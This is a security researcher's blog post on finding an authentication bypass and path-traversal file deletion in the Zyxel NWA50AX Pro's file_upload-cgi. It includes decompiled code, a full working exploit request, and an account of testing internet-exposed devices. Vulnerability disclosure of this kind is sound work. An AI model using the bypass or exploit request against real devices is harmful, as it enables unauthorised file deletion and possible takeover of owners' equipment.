---
layout: post
date:   2025-06-17 03:00:00 +0200
title:  "Zyxel NWA50AX Pro - Discovery of an Nday Variant"
categories: vulns4free
---

Today was an eventful day thanks to many interesting blog posts, e.g. from my [friends at watchTowr](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/). So I thought, why not publish a small quick-and-dirty blog post myself about a story from last week? This blog post may not be of the usual quality, but it was a good time to write it.

A few days ago I went on vacation in the mountains. Relaxing on green meadows, breathing in the mountain air and a hike every day to recharge my batteries from vulnerability research (VR). Getting away from work in the meantime turned out to be difficult once again, at least for one evening. After a long day on my feet, I would sit with a beer in the late night and stare around the apartment with satisfaction. Suddenly, I spotted this little buddy. It's name was **Zyxel NWA50AX Pro**, [a multi-gig WiFi 6 access point for small businesses](https://www.zyxel.com/global/en/products/wireless/ax3000-4-stream-wifi-6-dual-radio-nebulaflex-access-point-nwa50ax-pro).

{:refdef: style="text-align: center;"}
![Zyxel Device](/assets/images/zyxel/zyxel_device.png)
{: refdef}

This story will later explain the twist from 0day euphoria to nday but I don't want to anticipate too much at this stage.

# Gathering Information

I started asking Google about this device a bit and of course searched for publicly known vulnerabilities. A few were found, even with critical rating, injecting things into
host headers, cookies etc. Without being biased, I began searching for the firmware which was quickly found [here](https://www.zyxel.com/global/en/support/download?model=nwa50ax-pro).
Feeding my [unblob](https://unblob.org/) script with it easily revealed a squashfs file system.

```
bin  init   mnt      rom              rootfs_data.img_extract  tmp   var
dev  lib    overlay  root             sbin                     usr   www
etc  lib64  proc     rootfs_data.img  sys                      util
```

Browsing through a few directories led me to `/usr/local/`.

```
bin  lighttpd  sbin  ssl  zyxel-diaginfo  zyxel-gui
```

[lighttpd](https://www.lighttpd.net/) is a well-known web server used for embedded devices, so in the corresponding `conf` directory usually lies the config file `lighttpd.conf`.

```
var.log_root = "/var/log"
var.server_root = "/usr/local/lighttpd"
var.state_dir = "/var/run"
var.conf_dir = "/usr/local/lighttpd/conf"

server.tag = ""
server.document-root = "/usr/local/zyxel-gui/htdocs"
server.errorlog = log_root + "/error.log"
server.pid-file = state_dir + "/lighttpd.pid"
server.stat-cache-engine = "simple"
server.stream-request-body = 2
server.stream-response-body = 2

server.modules = (
  "mod_access",
  "mod_alias",
  "mod_redirect",
  "mod_rewrite",
  "mod_setenv",
  "mod_openssl"
)

index-file.names += (
  "weblogin.cgi", "index.html", "index.htm"
)

$HTTP["url"] =~ "\.pdf$" {
  server.range-requests = "disable"
}

$HTTP["host"] == "nap-slogin.nebula.zyxel.com" {
   url.rewrite-once = ( "^/CP/(.*)" => "/cgi-bin/tmp/captive-portal/$1")
}

server.follow-symlink = "enable"
server.upload-dirs = ( "/tmp" )

alias.url += ("/pub/" => "/tmp/daily-report/pub/")
alias.url += ("/lang/" => "/var/zyxel/lang/")

## Load the module configs.
include "conf.d/mime.conf"
include "conf.d/auth_zyxel.conf"
include "conf.d/setenv.conf"
include "conf.d/cgi.conf"

## Load runtime generated conf
include "/var/zyxel/service_conf/httpd_zld.conf"
include "/var/zyxel/service_conf/portal_used.conf"
```

More configuration files were included via directives such as `auth_zyxel.conf` and `cgi.conf`.
A bit of browsing on the guest device was all I got, because obviously I didn't have the opportunity to take the device apart and destroy it.
`.cgi` endpoints were quickly spotted in my proxy tool, even on the login page.

{:refdef: style="text-align: center;"}
![Login Page](/assets/images/zyxel/zyxelbefore.png)
{: refdef}

Calling some CGIs was allowed, most of them not: as expected. So how was authentication and authorization handled here? Maybe `auth_zyxel.conf` might give us some clues.

```
server.modules += ( "mod_auth_zyxel" )

#
# If URL does not match while list patterns below, request will be redirect to this location.
# NOTE: Admin type user will never be redirected.
#
auth_zyxel.AuthZyxelRedirect = "/"

#
# Global URL whilte list pattern
#
auth_zyxel.AuthZyxelSkipPattern	= (
	"/images",
	"/weblogin.cgi",
	"/I18N.js",
	"/language",
	"/logo",
	"/login.cgi",
	"/Clicktocontinue.cgi",
	"/nebula_ap_redirect.cgi",
	"/logout.cgi",
	"/find_me.cgi",
	"/social_login.cgi",
	"/nebula_ga_auth.cgi",
	"/userdata.html",
	"/jquery-3.2.1.min.js",
	"/tmp/captive-portal/",
	"/CP/",
	"/limit.html",
	"/fbwifi_forward.cgi",
	"/fbwifi_auth.cgi",
	"/fbwifi_continue.cgi",
	"/fbwifi_error.cgi",
	"/cdr.cgi",
	"/ip_reputation_block.cgi",
	"/dns_filter.cgi",
	"/cloud_idp_login.cgi"
)

#
# User or Guest type user whilte list pattern
#
auth_zyxel.AuthZyxelSkipUserPattern = ( 
	"/setuser.cgi",
	"/grant_access.html",
	"/cgi-bin/",
	"/frame_access.html",
	"/dummy.html"
)
```

Without really knowing anything about this target, words like *AuthZyxelSkipPattern* and *AuthZyxelSkipUserPattern* clearly trigger our VR senses.
The blackbox guy in me simply put all these paths into a word list and tried to [ffuf](https://github.com/ffuf/ffuf) anything interesting out of it.
Surprisingly, instead of a 302 status code suddenly some 200/400/500 appeared out of nothing. The permutation of `/yourenotallowedtoaccess.cgi/images`
gave access to the CGI binaries' logic from an unauthenticated context.

# lighttpd Questions

I was asking myself: is this a Zyxel thing or intended behavior in lighttpd configurations? We needed some testing ground, didn't we?
Docker is our friend for quick setups.

```yaml
lighttpd:
  image: sebp/lighttpd
  volumes:
    - /home/temp/lighttpdCGI/home:/var/www/localhost/htdocs
    - /home/temp/lighttpdCGI/config:/etc/lighttpd
  ports:
    - "8181:80"
  tty: true
```

How does a proper CGI configuration with lighttpd look like: read [official documentation](https://redmine.lighttpd.net/projects/lighttpd/wiki/Mod_cgi).
Using the Docker image author's [GitHub configuration files](https://github.com/spujadas/lighttpd-docker), I made some modifications making it CGI aware.

```
var.server_root = "/var/www/localhost/htdocs"

server.modules = (
SNIP
    "mod_alias",
SNIP
    "mod_cgi"
)

alias.url += ( "/cgi-bin" => server_root + "/cgi-bin" )
$HTTP["url"] =~ "/cgi-bin/" {
    cgi.assign = ( "" => "" )
}

cgi.assign     = (
    ".cgi" => ""
)
```

Then in our `home/cgi-bin` directory, we put a very simple CGI program

```cpp
#include <iostream>
using namespace std;
int main()
{
    cout<<"Content-type: text/plain"<<endl<<endl;
    cout<<"Hello World!"<<endl;
 
    return 0;
}
```

compiled with `gcc` statically on our host system and copied over. Starting the Docker container, and testing `/cgi-bin/test.cgi` versus `/cgi-bin/test.cgi/hiking`
gave the same results: the CGI was executed for both variants. Ok, that was enough of a proof for me to proceed with the Zyxel device.

# Hunting the Proper CGI

Now, we could reach probably any CGI binary without authentication, I started searching for interesting functions in each of them manually.
All binaries found in `/usr/local/lighttpd/cgi-bin` were put into Ghidra for a proper inspection. After an hour or so I landed at `file_upload-cgi`.
Would it have been a good idea to search for this CGI binary name now if someone else did some VR work already? Naaaaah, I'm on vacation so the serious
VR methodologies didn't apply to me.

The `entry` export was calling the function `FUN_001016a0`. I'll walk you through the interesting parts step by step. Be aware that I of course renamed
quite a few variables for explanatory reasons.

```c
  if (iVar2 == 0) {
    request = qcgireq_setoption(0,1,&DAT_SlashTmp,0,qcgireq_setoption); // [1]
    if ((request == 0) || (request = qcgireq_parse(request,0,qcgireq_parse), request == 0)) {
      uVar3 = 0xffff9e58;
LAB_00101998:
      FUN_0010229c(local_2808,uVar3);
      goto LAB_00101778;
    }
    DAT_00114260 = (**(code **)(request + 0x48))(request,&DAT_00102d2c); // [2]
    snprintf(acStack_2408,0x400,"%s.length","file_path");
    iVar2 = (**(code **)(request + 0x48))(request,acStack_2408); // [3]
    if (iVar2 == 0) { // [4]
      uVar3 = 0xffff9e57;
      goto LAB_00101998;
    }
```

At [1] the content of a request was stored at the address of the variable `request`. A certain query parameter was then read at [2] (`nv` in this case)
or even more interesting `file_path` at [3]. If the query parameter wasn't set, `iVar2` was equal to 0 and we would hit the branch at [4].
`uVar3` held an error code and got returned in the response. This was super convenient from my "static analysis and blackbox device access" perspective.

This code was a recurring pattern of this function and so I could simply control which branch my request was running into depending on the response error codes.
E.g. by not setting any parameters with a simple GET request to `/cgi-bin/file_upload-cgi/images`, the following page was returned.

```
HTTP/2 200 OK
Content-Type: text/html
SNIP

<html><head></head><body>
<script type="text/javascript">
var errno0=-25001; var errmsg0="Warning ULCGI no any text typed!";
top.frames[2].frames[1].document.(null).return_errno.value=errno0; top.frames[2].frames[1].document.(null).return_errmsg.value=errmsg0;
</script>
</body></html>
```

`errno0=-25001` corresponds to exactly one of the error codes of `uVar3`. Flowing through the functions' code from top to bottom, I stopped at this.

```c
file_path = (char *)(**(code **)(request + 0x30))(request,"file_path",0);
if (file_path == (char *)0x0) {
  uVar3 = 0xffff9e58;
}
else {
  snprintf(acStack_2008,0x1000,"%s/%s",&DAT_SlashTmp,file_path.filename,snprintf); // [7]
  unlink(acStack_2008); // [5]
  rename(file_path,acStack_2008); // [6]
  iVar2 = strcmp(__s1,"firmware");
```

An `unlink` call at [5] (basically a file delete) and a following `rename` [5] had piqued my interest. In addition, at [7] my user-controlled `file_path.filename`
query parameter was concatenated to a static path prefix via `snprintf`. Smells like path traversal, doesn't it? As indicated by my renamed variable `DAT_SlashTmp`,
this was a static value of `/tmp`, probably enabling me to traverse out of the intended context: `/tmp/../../../im/a/hackerman`.

# Exploitation Success

Response error code debugging led me to the following POST request, hopefully deleting (thanks to `unlink`) the logo PNG file used at the login page.

```
POST /cgi-bin/file_upload-cgi/images HTTP/1.1
Host: TARGET
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 230

file_path=/usr/local/zyxel-gui/htdocs/ext-js/web-pages/login/images/login_logo.png&nv=a&file_path.length=48&file_type=certlocal&vn=b&file_path.filename=../usr/local/zyxel-gui/htdocs/ext-js/web-pages/login/images/login_logo.png
```

After firing the request, a direct comparison of the original login page

{:refdef: style="text-align: center;"}
![Before](/assets/images/zyxel/zyxelbefore.png)
{: refdef}


revealed a successful deletion.

{:refdef: style="text-align: center;"}
![Before](/assets/images/zyxel/zyxelafter.png)
{: refdef}

With an arbitrary file delete primitive alone, several further attacks should have been possible. Especially by abusing the `rename` call afterwards, this should
give us another primitive of deleting a file and being replaced by, let's say, a backup'd version (password file \*cough\*).

# Impact

Alright, we didn't see any related CVEs in the last years for **this special device** but could I find them on the public internet as well?
Luckily, some were easily identified in no time. Vulnerable test as easy as sending a GET request to `/cgi-bin/file_upload-cgi/images` with a response
similar to the one mentioned above. The one in my apartment was vulnerable indeed, as were >80% of the 42 devices I found. I didn't test the non-Pro version devices
for which CensysIO returns over 200. But what about the Pro devices returning 400 instead?

Doing VR without following the standard methodologies might not had been my best idea, as it turned out. Searching for the 400 status code in Ghidra gave me this.

```c
LAB_00101784:
  if (local_2808[0] != '\0') {
    puts("Content-Type: text/html\r\n\r");
    puts("<html><head></head><body>\r");
    if (DAT_00114260 == 0) {
      puts("<script type=\"text/javascript\">\r");
    }
```

How did I hit this code then? At the very top of my main function, even before the deeply investigated `if` branch which I successfully exploited a few minutes ago...

```c
  iVar2 = VRDuringVacation();
  if (iVar2 == 0) { // iVar2 could be 6 :-P
	// I want to get here!!
```

the `VRDuringVacation` checked for auth cookies.

```c
  __cp = getenv("REMOTE_ADDR");
  pcVar2 = getenv("HTTP_COOKIE"); // [8]
  if ((pcVar2 != (char *)0x0) && (pcVar2 = strstr(pcVar2,"authtok="), pcVar2 != (char *)0x0)) { // [9]
    strlcpy(&local_418,pcVar2 + 8,0x41,strlcpy);
    iVar1 = inet_pton(2,__cp,local_430);
    if (iVar1 == 1) {
      iVar1 = uam_find_first_match
                        (auStack_3d0,"http/https",0,local_430[0],&local_418,uam_find_first_match);
    }
    else {
      iVar1 = inet_pton(10,__cp,auStack_428);
      if (iVar1 != 1) goto LAB_00102338;
      iVar1 = uam_find_first_match6
                        (auStack_3d0,"http/https",0,auStack_428,&local_418,uam_find_first_match6);
    }
    if (0 < iVar1) goto LAB_0010233c;
  }
LAB_00102338:
  local_277 = 6; // [10]
LAB_0010233c:
  if (local_8 == ___stack_chk_guard) {
    return local_277; // // [11]
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(__stack_chk_fail);
```

It retrieved the cookie at [8], checked for the substring `authtok=` [9], and set the return value to 6 [10] [11] eventually. I didn't even check the implementations for
`uam_find_first_match` or `uam_find_first_match6` to realize that some patching had taken place on this latest version of the firmware.

# Sometimes Truth Hits Hard

I had now spent four hours in the glorious night on these beautiful mountains analyzing this device. My Google-fu maybe wasn't good enough.
Indeed, after another half an hour an excellent Outpost24 blog post written by Timothy Hjort about ["Five new vulnerabilities found in Zyxel NAS devices (including code execution and privilege escalation)"](https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/) from June 2024 popped up. But wait...**Zyxel NAS** devices? Of course, this excuse came in handy late at night.
It was bit harder to infer from NAS to NWA50AX Pro vulnerabilities. I highly recommend everyone to read Timothy's blog post and you'll see that he also took some other approaches
for his CVE-2024-29974 containing parts of `file_upload-cgi`. Even more interesting to read after my work was done.

# Conclusions

Vacation and VR combined? No such as great idea. BUT I've learnt a ton of new things and also found an nday variant because I'm not sure if there are any related publicly known
vulnerabilities (e.g. CVEs) for all these affected **Zyxel NWA50AX Pro** devices. Vendors with a large repertoire of products typically share large amount of code bases.
This can lead to a lot of confusion for vulnerability management people, especially in our CVE-centric world.

This weekend, I'm going on another hiking trip, but my laptop(s) will stay at home.


